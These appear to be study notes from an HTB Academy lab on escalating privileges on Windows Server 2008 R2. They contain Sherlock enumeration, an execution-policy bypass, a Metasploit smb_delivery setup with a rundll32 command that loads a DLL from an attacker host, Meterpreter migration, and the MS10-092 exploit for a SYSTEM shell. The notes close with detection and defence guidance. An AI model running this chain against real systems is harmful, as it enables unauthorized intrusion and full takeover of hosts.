# Windows Server 2008 Exploitation

## 🎯 Overview

**Windows Server 2008/2008 R2** reached **end-of-life January 14, 2020** and lacks modern security features. Legacy systems are commonly found in **medical settings**, **universities**, and **government offices** running **mission-critical applications**. These systems present significant **privilege escalation opportunities** through **missing patches** and **kernel exploits**.

## 📊 Security Feature Comparison

### Server Version Security Matrix
```cmd
Feature                              | 2008 R2 | 2012 R2 | 2016 | 2019
-------------------------------------|---------|---------|------|------
Enhanced Windows Defender ATP        |    ❌   |    ❌   |  ✅  |  ✅
Just Enough Administration           | Partial | Partial |  ✅  |  ✅  
Credential Guard                      |    ❌   |    ❌   |  ✅  |  ✅
Remote Credential Guard               |    ❌   |    ❌   |  ✅  |  ✅
Device Guard (code integrity)        |    ❌   |    ❌   |  ✅  |  ✅
AppLocker                             | Partial |    ✅   |  ✅  |  ✅
Windows Defender                      | Partial | Partial |  ✅  |  ✅
Control Flow Guard                    |    ❌   |    ❌   |  ✅  |  ✅

# Result: Server 2008 lacks most modern security protections
```

## 🔍 Patch Level Enumeration

### WMI Hotfix Query
```cmd
# Check installed patches:
wmic qfe

# Example output (severely outdated):
Caption                                     HotFixID   InstallDate  InstalledBy
http://support.microsoft.com/?kbid=2533552  KB2533552  3/31/2021    WINLPE-2K8\Administrator

# Analysis: Only one patch since 2021 = highly vulnerable
```

### System Information Gathering
```cmd
# Comprehensive system details:
systeminfo

# Key information:
- OS Version: Windows Server 2008 R2
- Install Date: Check age of system
- Hotfixes: List of installed patches
- Network Configuration: Domain membership
```

## 🔧 Sherlock Vulnerability Assessment

### Sherlock Script Usage
```powershell
# Set execution policy:
Set-ExecutionPolicy bypass -Scope process

# Import and run Sherlock:
cd C:\Tools\
Import-Module .\Sherlock.ps1
Find-AllVulns
```

### Common Server 2008 Vulnerabilities
```cmd
# Typical Sherlock findings:
MS10-092 (CVE-2010-3338)  # Task Scheduler XML - Appears Vulnerable
MS15-051 (CVE-2015-1701)  # ClientCopyImage Win32k - Appears Vulnerable  
MS16-032 (CVE-2016-0099)  # Secondary Logon Handle - Appears Vulnerable

# 64-bit limitations:
MS10-015 (KiTrap0D)       # Not supported on 64-bit systems
MS13-053 (Win32k Pool)    # Not supported on 64-bit systems
MS16-016 (WebDAV)         # Not supported on 64-bit systems
```

## 🚀 Metasploit Privilege Escalation

### SMB Delivery Module Setup
```bash
# Start Metasploit:
sudo msfconsole -q
use exploit/windows/smb/smb_delivery

# Configure options:
set LHOST <attacker_ip>
set SRVHOST <attacker_ip>
set target 0                    # DLL target
exploit

# Result: Rundll32 command for target execution
rundll32.exe \\<attacker_ip>\<share>\test.dll,0
```

### Initial Shell Acquisition
```cmd
# Execute on target (Command Prompt):
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0

# Result: Meterpreter session as current user
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609)
```

### Process Migration for 64-bit
```cmd
# Check current process:
meterpreter > getpid
Current pid: 2268

# List processes:
meterpreter > ps

# Migrate to 64-bit process:
meterpreter > migrate 2796    # Choose x64 process
[*] Migration completed successfully.

# Background session:
meterpreter > background
```

### MS10-092 Privilege Escalation
```bash
# Use Task Scheduler exploit:
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <attacker_ip>
set LPORT 4443
exploit

# Exploit process:
[*] Creating task: isqR4gw3RlxnplB
[*] Reading task file contents...
[*] Writing modified content back...
[*] Executing the task...
[*] Deleting the task...

# Result: NT AUTHORITY\SYSTEM shell
```

## 🎯 HTB Academy Lab Walkthrough

### Lab Environment
```cmd
# Access: RDP with htb-student:HTB_@cademy_stdnt!
# Target: Windows Server 2008 R2
# Objective: Get Administrator flag.txt
```

### Step-by-Step Solution

#### 1. Initial Access
```bash
# Connect via RDP:
rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <target_ip>
# Alternative if xfreerdp fails:
# rdesktop -u htb-student -p HTB_@cademy_stdnt! <target_ip>
```

#### 2. Patch Level Enumeration
```cmd
# Open Command Prompt and check patches:
wmic qfe

# Expected result: Very few patches, severely outdated system
Caption                                     HotFixID   InstallDate
http://support.microsoft.com/?kbid=2533552  KB2533552  3/31/2021
```

#### 3. Vulnerability Assessment
```powershell
# Set PowerShell execution policy:
Set-ExecutionPolicy bypass -Scope process
# Choose: Y (Yes)

# Navigate to tools and run Sherlock:
cd C:\Tools\
Import-Module .\Sherlock.ps1
Find-AllVulns

# Key findings:
MS10-092 - Task Scheduler .XML - Appears Vulnerable
MS15-051 - ClientCopyImage Win32k - Appears Vulnerable
MS16-032 - Secondary Logon Handle - Appears Vulnerable
```

#### 4. Metasploit Setup (Attack Machine)
```bash
# Start Metasploit:
sudo msfconsole -q
use exploit/windows/smb/smb_delivery

# Configure module:
set LHOST <your_vpn_ip>
set SRVHOST <your_vpn_ip>
exploit

# Copy the rundll32 command provided
# Example: rundll32.exe \\10.10.14.80\tXWM\test.dll,0
```

#### 5. Initial Shell (Target Machine)
```cmd
# Execute in Command Prompt on target:
rundll32.exe \\<your_vpn_ip>\<share>\test.dll,0

# Result: Meterpreter session established
```

#### 6. Process Migration (Attack Machine)
```bash
# Interact with session:
sessions -i 1

# Check processes and migrate to 64-bit:
ps
migrate <64bit_process_pid>    # e.g., migrate 1304

# Background session:
bg
```

#### 7. Privilege Escalation
```bash
# Use MS10-092 exploit:
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <your_vpn_ip>
set LPORT 4443
exploit

# Result: New session as NT AUTHORITY\SYSTEM
```

#### 8. Flag Retrieval
```cmd
# Drop to shell:
shell

# Get Administrator flag:
type C:\Users\Administrator\Desktop\flag.txt

# Expected result: Flag content displayed
```

## 🔄 Alternative Privilege Escalation Methods

### Manual Exploit Compilation
```cmd
# For environments where Metasploit is restricted:
# Download exploit source code from exploit-db
# Compile on Windows or cross-compile on Linux
# Transfer to target and execute

# Example MS15-051 compilation:
# Download: https://www.exploit-db.com/exploits/37367/
# Compile with Visual Studio or mingw
# Execute: .\ms15-051.exe "cmd.exe"
```

### PowerShell-Based Exploits
```powershell
# PowerUp for comprehensive enumeration:
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks for Server 2008:
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
```

## 🛠️ Legacy System Considerations

### Business Context Assessment
```cmd
# Consider before recommending removal:
- Mission-critical software dependencies
- Cost of system replacement/upgrade
- Regulatory compliance requirements
- Vendor support availability
- Network segmentation controls
- Extended support contracts

# Medical/Industrial examples:
- MRI software on Windows XP/7
- Manufacturing control systems
- Legacy database applications
- Specialized hardware drivers
```

### Risk Mitigation Strategies
```cmd
# When systems cannot be upgraded:
- Network segmentation/isolation
- Additional monitoring and logging
- Custom extended support contracts
- Application allowlisting
- Enhanced access controls
- Regular vulnerability assessments
- Incident response planning
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Sherlock script execution
- Metasploit SMB delivery usage
- Rundll32 execution with UNC paths
- Task Scheduler exploit signatures
- Process migration activities
- Unusual scheduled task creation/deletion
```

### Defensive Measures
```cmd
# Legacy system protection:
- Apply all available security patches
- Implement network segmentation
- Deploy endpoint detection and response
- Monitor for exploit signatures
- Restrict administrative access
- Regular security assessments
- Plan for system modernization
```

## 💡 Key Takeaways

1. **Server 2008** lacks modern security features and is highly vulnerable
2. **Patch enumeration** reveals missing critical security updates
3. **Sherlock** provides comprehensive vulnerability assessment for legacy systems
4. **MS10-092** Task Scheduler exploit is reliable for Server 2008 privilege escalation
5. **Process migration** to 64-bit required for some exploits
6. **Business context** critical when dealing with legacy systems
7. **Multiple escalation vectors** available on unpatched systems

---

*Windows Server 2008 systems represent high-value targets due to missing security features and unpatched vulnerabilities, but business considerations must guide remediation recommendations.* 